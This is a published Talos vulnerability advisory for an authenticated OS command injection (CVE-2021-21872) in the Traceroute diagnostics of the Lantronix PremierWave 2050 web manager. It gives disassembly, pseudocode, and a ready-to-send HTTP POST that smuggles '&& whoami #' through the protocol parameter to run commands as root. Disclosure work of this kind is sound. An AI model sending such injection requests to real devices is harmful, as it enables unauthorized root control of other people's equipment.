# Talos Vulnerability Report

### TALOS-2021-1312

## Lantronix PremierWave 2050 Web Manager Diagnostics: Traceroute OS command injection vulnerability

##### November 15, 2021

##### CVE Number

CVE-2021-21872

### Summary

An OS command injection vulnerability exists in the Web Manager Diagnostics: Traceroute functionality of Lantronix PremierWave 2050 8.9.0.0R4. A specially-crafted HTTP request can lead to arbitrary command execution. An attacker can make an authenticated HTTP request to trigger this vulnerability.

### Tested Versions

Lantronix PremierWave 2050 8.9.0.0R4 (in QEMU)

### Product URLs

<https://www.lantronix.com/products/premierwave2050/>

### CVSSv3 Score

9.9 - CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H

### CWE

CWE-78 - Improper Neutralization of Special Elements used in an OS Command (‘OS Command Injection’)

### Details

PremierWave 2050 is an embedded Wi-Fi Module manufactured by Lantronix.

The PremierWave 2050 Web Manager interface provides a network diagnostics interface that allows an unprivileged, authenticated user to diagnose network connectivity problems between the PremierWave 2050 and an arbitrary network address. This functionality is implemented using a `system` call to the `traceroute` application. The underlying command is built using an unsanitized and attacker-controlled HTTP parameter, `protocol`. This command is executed with root privileges.

The application expects that the `protocol` value will be one of `udp | tcp | icmp` but does not validate the field before injecting it directly into the below command.

```
PUSH            {R4-R10,LR}
LDR             R1, =aHost_0 ; "host"
SUB             SP, SP, #0x120
MOV             R4, R0
BL              http__get_POST_param_by_name
LDR             R1, =aProtocol_0 ; "protocol"
LDR             R7, =PrintPostResults
MOV             R5, R0
MOV             R0, R4
BL              http__get_POST_param_by_name
MOV             R6, R0

...

CMP             R6, #0
BNE             loc_BEEAC
LDR             R1, =(aProcNetTcp+0xA) ; "tcp"
B               loc_BEEBC
LDRB            R3, [R6]
CMP             R3, #0
BEQ             loc_BEEA4
MOV             R1, R6
MOV             R2, R5
LDR             R0, =aTracerouteSM40 ; "traceroute --%s -m 40 -w 1 -q 1 %s | ta"...
BL              sprintf_malloc
MOV             R3, #0
ADD             R1, SP, #0x140+results ; results
ADD             R2, SP, #0x140+num_bytes ; a3
STR             R3, [SP,#0x140+results]
STR             R3, [SP,#0x140+num_bytes]
MOV             R7, R0
BL              exec_system_cmd_ex

```

The above effectively decompiles into the below pseudocode:

```
host = get_POST_param_by_name("host");
protocol = get_POST_param_by_name("protocol");
...
if !(protocol && *protocol)
    protocol = "tcp";  // If the user doesn't supply a protocol, default to tcp
...
command = sprintf_malloc("traceroute --%s -m 40 -w 1 -q 1 %s | tail -n +2", protocol, host);
exec_system_cmd_ex(command, &results, &num_bytes);

```

A properly-formatted HTTP request can escape the intended command and execute arbitrary commands with root privileges.

```
POST / HTTP/1.1
Host: [IP]:[PORT]
Authorization: Basic YnJvd25pZTpwb2ludHM=
Content-Length: 111
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

ajax=Traceroute&host=192.168.0.254&protocol=help %26%26 whoami #&iehack=&submit=Traceroute

```

The above request results in the execution of the following command:

```
traceroute --help && whoami #

```
